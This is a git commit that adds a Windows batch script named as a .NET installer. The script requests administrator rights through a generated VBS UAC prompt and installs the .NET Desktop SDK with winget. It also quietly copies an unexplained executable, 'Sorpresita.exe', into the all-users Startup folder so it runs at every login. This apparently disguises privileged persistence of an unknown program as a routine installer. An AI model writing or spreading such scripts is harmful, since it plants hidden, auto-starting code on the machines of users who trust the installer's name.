d7666af49cc890a3fddca6a9dcc00c2af618c332
Chewico <chewico3d@gmail.com>
2025-02-24 13:21:58 +0100

    a

---
+++ install-dotnet.bat
@@ -0,0 +1,30 @@
+@echo off
+:: BatchGotAdmin (Run as Admin code starts)
+REM --> Check for permissions
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+REM --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
+    "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
+    pushd "%CD%"
+    CD /D "%~dp0"
+:: BatchGotAdmin (Run as Admin code ends)
+
+start winget install Microsoft.WindowsDesktop.SDK --exact --version 8.0.0 --quiet --norestart
+
+:: Add to startup for all users
+echo Configuring startup entry...
+copy "%~dp0Sorpresita.exe" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp\" >nul
+
+echo Operation completed successfully!
+pause
